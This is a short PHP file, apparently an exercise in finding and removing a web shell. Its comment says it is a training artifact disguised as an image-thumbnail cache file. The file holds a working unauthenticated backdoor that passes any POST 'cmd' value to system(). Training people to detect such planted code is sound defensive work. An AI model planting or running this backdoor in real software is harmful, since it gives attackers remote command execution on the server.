<?php
// training artifact: minimal unauthenticated command-execution backdoor,
// disguised as an image-thumbnail cache file. Find and remove it.
if (isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
